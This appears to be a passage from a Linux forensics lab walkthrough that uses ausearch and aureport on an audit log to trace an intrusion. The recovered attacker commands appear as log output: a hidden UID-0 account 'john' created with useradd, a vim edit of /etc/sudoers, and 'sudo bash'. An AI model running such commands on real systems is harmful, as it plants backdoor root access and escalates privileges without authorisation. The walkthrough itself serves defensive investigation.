Next, can you determine the PPID of the `/bin/bash` process that was initiated at 18:48:25?

```
916
```

The next question can be:

- How and which new user was created?

Therefore, find events associated with user creation:

```bash
linuxforensics@ubuntu:~/tools/Zircolite$ sudo ausearch --syscall EXECVE -if audit_full.log -i --start 10/15/2023 '18:00:00' -te 10/15/2023 '18:50:00' | grep -v "grep" | grep "useradd"

type=PROCTITLE msg=audit(10/15/2023 18:25:18.339:6561) : proctitle=useradd -ou 0 -g 0 john
type=PATH msg=audit(10/15/2023 18:25:18.339:6561) : item=0 name=/usr/sbin/useradd inode=276398 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=EXECVE msg=audit(10/15/2023 18:25:18.339:6561) : argc=6 a0=useradd a1=-ou a2=0 a3=-g a4=0 a5=john
type=SYSCALL msg=audit(10/15/2023 18:25:18.339:6561) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x561bc231fc00 a1=0x561bc2320500 a2=0x561bc231d9b0 a3=0x8 items=2 ppid=27788 pid=27790 auid=unset uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=unset comm=useradd exe=/usr/sbin/useradd subj=unconfined key=user_modification
```

Alternatively, you can use aureport as well to find the username created during an attack:

```bash
linuxforensics@ubuntu:~/tools/Zircolite$ sudo aureport -if audit_full.log -m

Account Modifications Report
=================================================
# date time auid addr term exe acct success event
=================================================
1. 10/15/2023 18:25:18 -1 ? ? /usr/sbin/useradd ? yes 6566
2. 10/15/2023 18:25:39 -1 ? ? /usr/bin/passwd john yes 6581
```

In the `Linux.Sys.Users.json` and `Linux.Users.RootUsers.json` you can find the entries for standard and root users:

```bash
Linux users: Linux.Sys.Users.json:
{"User":"john","Description":"","Uid":"0","Gid":"0","Homedir":"/home/john","Shell":"/bin/sh"}
{"User":"user","Description":"user","Uid":"1000","Gid":"1000","Homedir":"/home/user","Shell":"/bin/bash"}

Linux root users: Linux.Users.RootUsers.json
{"Host":null,"User":"root","Description":"root","Uid":"0","Gid":"0","Homedir":"/root","Shell":"/bin/bash"}
{"Host":null,"User":"john","Description":"","Uid":"0","Gid":"0","Homedir":"/home/john","Shell":"/bin/sh"}
```

To address the lingering question of how the `/etc/sudoers` file was modified, the following command should provide the necessary information.

```bash
linuxforensics@ubuntu:~/tools/Zircolite$ sudo ausearch -f /etc/sudoers -if audit_full.log -i --start 10/15/2023 '18:00:00' -te 10/15/2023 '19:00:00'

----
type=PROCTITLE msg=audit(10/15/2023 18:20:50.030:6517) : proctitle=vim /etc/sudoers
type=PATH msg=audit(10/15/2023 18:20:50.030:6517) : item=3 name=/etc/sudoers~ inode=132058 dev=fd:00 mode=file,440 ouid=root ogid=root rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=PATH msg=audit(10/15/2023 18:20:50.030:6517) : item=2 name=/etc/sudoers inode=132058 dev=fd:00 mode=file,440 ouid=root ogid=root rdev=00:00 nametype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=PATH msg=audit(10/15/2023 18:20:50.030:6517) : item=1 name=/etc/ inode=131074 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=PATH msg=audit(10/15/2023 18:20:50.030:6517) : item=0 name=/etc/ inode=131074 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=SYSCALL msg=audit(10/15/2023 18:20:50.030:6517) : arch=x86_64 syscall=rename success=yes exit=0 a0=0x55b6a53aec20 a1=0x55b6a5602730 a2=0xfffffffffffffc60 a3=0x0 items=4 ppid=1434 pid=27745 auid=unset uid=user gid=user euid=root suid=root fsuid=root egid=user sgid=user fsgid=user tty=(none) ses=unset comm=vim exe=/usr/bin/vim.basic subj=unconfined key=actions
----
<SNIP>
```

So you can see that the user used vim to modify the `/etc/sudoers` file and perform privilege escalation. `ausearch` can also be used to generate a timeline of events:

```bash
linuxforensics@ubuntu:~/tools/Zircolite$ sudo ausearch --syscall EXECVE -if audit_full.log -i --start 10/15/2023 '18:00:00' -te 10/15/2023 '18:50:00' | grep -v "grep" | grep "type=EXECVE" | grep "vim.basic\|sudoers"

type=EXECVE msg=audit(10/15/2023 18:20:06.170:6503) : argc=3 a0=sh a1=-c a2=vimglob() { while [ $# -ge 1 ]; do echo "$1"; shift; done }; vimglob >/tmp/vCZw76e/11 ~/.vim/syntax/sudoers.vim
type=EXECVE msg=audit(10/15/2023 18:20:06.966:6504) : argc=3 a0=sh a1=-c a2=vimglob() { while [ $# -ge 1 ]; do echo "$1"; shift; done }; vimglob >/tmp/vCZw76e/12 ~/.vim/syntax/sudoers/*.vim
type=EXECVE msg=audit(10/15/2023 18:20:08.654:6505) : argc=3 a0=sh a1=-c a2=vimglob() { while [ $# -ge 1 ]; do echo "$1"; shift; done }; vimglob >/tmp/vCZw76e/13 ~/.vim/after/syntax/sudoers.vim
type=EXECVE msg=audit(10/15/2023 18:20:08.658:6506) : argc=3 a0=sh a1=-c a2=vimglob() { while [ $# -ge 1 ]; do echo "$1"; shift; done }; vimglob >/tmp/vCZw76e/14 ~/.vim/after/syntax/sudoers/*.vim
type=EXECVE msg=audit(10/15/2023 18:20:11.510:6513) : argc=3 a0=sh a1=-c a2=vimglob() { while [ $# -ge 1 ]; do echo "$1"; shift; done }; vimglob >/tmp/vCZw76e/21 ~/.vim/syntax/sudoers.vim
type=EXECVE msg=audit(10/15/2023 18:20:11.510:6514) : argc=3 a0=sh a1=-c a2=vimglob() { while [ $# -ge 1 ]; do echo "$1"; shift; done }; vimglob >/tmp/vCZw76e/22 ~/.vim/syntax/sudoers/*.vim
type=EXECVE msg=audit(10/15/2023 18:20:11.514:6515) : argc=3 a0=sh a1=-c a2=vimglob() { while [ $# -ge 1 ]; do echo "$1"; shift; done }; vimglob >/tmp/vCZw76e/23 ~/.vim/after/syntax/sudoers.vim
type=EXECVE msg=audit(10/15/2023 18:20:11.518:6516) : argc=3 a0=sh a1=-c a2=vimglob() { while [ $# -ge 1 ]; do echo "$1"; shift; done }; vimglob >/tmp/vCZw76e/24 ~/.vim/after/syntax/sudoers/*.vim
```

```bash
linuxforensics@ubuntu:~/tools/Zircolite$ sudo ausearch -if audit_full.log -i --start 10/15/2023 '18:00:00' -te 10/15/2023 '18:50:00' | grep -v "grep" | grep -v "/usr/bin/dpkg --status-fd" | grep "PROCTITLE"

<SNIP>
type=PROCTITLE msg=audit(10/15/2023 18:20:50.030:6517) : proctitle=vim /etc/sudoers
type=PROCTITLE msg=audit(10/15/2023 18:20:50.030:6518) : proctitle=vim /etc/sudoers
type=PROCTITLE msg=audit(10/15/2023 18:20:50.038:6519) : proctitle=vim /etc/sudoers
type=PROCTITLE msg=audit(10/15/2023 18:20:50.038:6520) : proctitle=vim /etc/sudoers
type=PROCTITLE msg=audit(10/15/2023 18:20:50.038:6521) : proctitle=vim /etc/sudoers
type=PROCTITLE msg=audit(10/15/2023 18:20:50.038:6522) : proctitle=vim /etc/sudoers
type=PROCTITLE msg=audit(10/15/2023 18:20:52.342:6523) : proctitle=sudo bash
type=PROCTITLE msg=audit(10/15/2023 18:20:52.350:6524) : proctitle=sudo bash
type=PROCTITLE msg=audit(10/15/2023 18:20:52.354:6529) : proctitle=bash
type=PROCTITLE msg=audit(10/15/2023 18:20:58.070:6530) : proctitle=whoami
<SNIP>
```

Retrieving all those timestamps you can create a solid timeline of events and actions that describe when, what, and by whom a certain event was triggered. It makes it possible for you to pinpoint entry vector, trace lateral movement, and quantify the radius of an attack with great precision.